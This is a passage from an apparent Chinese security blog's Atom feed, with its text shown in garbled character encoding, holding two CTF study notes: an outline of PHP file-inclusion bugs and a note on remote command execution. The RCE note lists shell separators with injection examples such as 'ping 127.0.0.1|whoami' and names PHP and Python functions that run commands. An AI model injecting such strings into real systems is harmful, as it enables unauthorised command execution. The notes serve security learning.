    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹"></a>æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹</h1><p>å¤šæ•°æƒ…å†µæ­¤å¤„åªè€ƒè™‘phpå¼€å‘çš„åç«¯ç½‘ç«™ã€CTF èµ›é¢˜ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h3><p>php ä¸­ï¼Œä¸æ–‡ä»¶åŒ…å«ç›¸å…³çš„å‡½æ•°</p><p>require()<br>require_once()<br>include()<br>include_once()</p><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><ul><li>allow_url_open = on</li></ul><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><h3 id="ååºåˆ—åŒ–-SSRF-gt-æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–"><a href="#ååºåˆ—åŒ–-SSRF-gt-æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–" class="headerlink" title="(ååºåˆ—åŒ–)SSRF -&gt; æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–"></a>(ååºåˆ—åŒ–)SSRF -&gt; æœ¬åœ°æ–‡ä»¶åŒ…å«ã€è¯»å–</h3><h3 id="æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«</h3><h3 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><h3 id="session-æ–‡ä»¶åŒ…å«"><a href="#session-æ–‡ä»¶åŒ…å«" class="headerlink" title="session æ–‡ä»¶åŒ…å«"></a>session æ–‡ä»¶åŒ…å«</h3><h1 id="Tomcat-Ajp-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"><a href="#Tomcat-Ajp-æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="Tomcat Ajp æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´"></a>Tomcat Ajp æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶è¯»å–æ¼æ´</h1><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«æ¼æ´æŠ€æœ¯ç‚¹&lt;/h1&gt;&lt;p&gt;å¤šæ•°æƒ…å†µæ­¤å¤„åªè€ƒè™‘phpå¼€å‘çš„åç«¯ç½‘ç«™ã€CTF èµ›é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸºç¡€</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF - RCE</title>
    <link href="https://hack-for.fun/dbb484a9.html"/>
    <id>https://hack-for.fun/dbb484a9.html</id>
    <published>2020-08-30T14:20:10.000Z</published>
    <updated>2020-09-02T16:37:39.549Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹"><a href="#RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹"></a>RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æºç ç¼–å†™é€»è¾‘ä¸ä¸¥ï¼Œå‚æ•°å…¥å£è¿‡æ»¤ä¸ä¸¥æˆ–è€…æ²¡è¿‡æ»¤ã€‚</p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ul><li>å­˜åœ¨æ“ä½œè€…å¯æ§çš„è¾“å…¥</li><li>å­˜åœ¨å¯æ‰§è¡Œä»»æ„ä»£ç çš„å±é™©å‡½æ•°ï¼ˆé€šè¿‡å„ç§æ‰‹æ®µï¼ŒåŒ…æ‹¬ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€‚</li><li>å­˜åœ¨å¯æ‰§è¡Œè¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</li></ul><h2 id="Linux-ã€Windows-ç®¡é“ç¬¦"><a href="#Linux-ã€Windows-ç®¡é“ç¬¦" class="headerlink" title="Linux ã€Windows ç®¡é“ç¬¦"></a>Linux ã€Windows ç®¡é“ç¬¦</h2><p>Windows ç³»ç»Ÿç®¡é“ç¬¦</p><ul><li>â€œ|â€ ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚eg: ping 127.0.0.1|whoami</li><li>â€œ||â€ï¼šå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ã€‚å‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ï¼Œeg: ping 2||whoami</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200831112903.png" alt="image-20200831105326087"></p><ul><li>â€œ&amp;â€ï¼šå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚eg: ping 127.0.0.1&amp;whoam</li><li>â€œ&amp;&amp;â€ ï¼šå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢è¯­å¥åªèƒ½ä¸ºçœŸã€‚eg : ping 127.0.0.1&amp;&amp;whoami</li></ul><p>Linux ç³»ç»Ÿç®¡é“ç¬¦</p><p>åŒºåˆ«ä¸å¤§ï¼Œè¿™é‡Œåªåˆ—å‡ºä¸åŒçš„ã€‚</p><ul><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚eg : ping 127.0.0.1;whoami</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥æ‰§è¡Œçš„ç»“æœã€‚eg: ping 127.0.0.1|whoami</li></ul><h2 id="PHP-å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°"><a href="#PHP-å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°" class="headerlink" title="PHP å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°"></a>PHP å¯æ‰§è¡Œä»£ç ã€å‘½ä»¤çš„å‡½æ•°</h2><blockquote><p>PHP å…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œ</p></blockquote><p><a href="https://hack-for.fun/d8714939.html#RCE">https://hack-for.fun/d8714939.html#RCE</a></p><ul><li>eval</li><li>assert</li><li>preg_replace() + /eï¼ˆphp &lt; 5.5.0) ä¸‹å¯¹æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œ(ä»¥evalçš„å½¢å¼)ä»£ç æ‰§è¡Œ ï¼ˆphpé«˜ç‰ˆæœ¬å·²ç»åºŸé™¤</li><li>create_function å›è°ƒä»£ç æ‰§è¡Œ</li><li>system() exec() ,shell_exec,passthru.pcntl_exec,popen,proc_popen ç­‰ç”¨äºæ‰§è¡Œå¤–éƒ¨ç¨‹åºçš„<code>command</code>å‘½ä»¤</li><li>åå¼•å·å‘½ä»¤æ‰§è¡Œ</li></ul><hr><p>ä¸€äº›é«˜çº§æŠ€å·§ï¼š</p><ul><li>é™åˆ¶å­—ç¬¦é•¿åº¦RCE</li><li>æ— å‚æ•°RCE</li><li>æ— å­—æ¯æ•°å­— webshell</li></ul><h2 id="å…¶ä»–è¯­è¨€ï¼ˆPython-JAVA"><a href="#å…¶ä»–è¯­è¨€ï¼ˆPython-JAVA" class="headerlink" title="å…¶ä»–è¯­è¨€ï¼ˆPython, JAVA"></a>å…¶ä»–è¯­è¨€ï¼ˆPython, JAVA</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>subprocess æ¨¡å—</p><p>å¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„ç›¸å…³æ¨¡å—å’Œå‡½æ•°æœ‰ï¼š</p><p>os.system<br>os.spawn<br>os.popen â€“åºŸå¼ƒ<br>popen2.* â€“åºŸå¼ƒ<br>commands.* â€“åºŸå¼ƒï¼Œ3.xä¸­è¢«ç§»é™¤</p><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#RCE-è¿œç¨‹ä»£ç -å‘½ä»¤æ‰§è¡Œ-æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;RCE(è¿œç¨‹ä»£ç \å‘½ä»¤æ‰§è¡Œ)æ¼æ´</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
</feed>
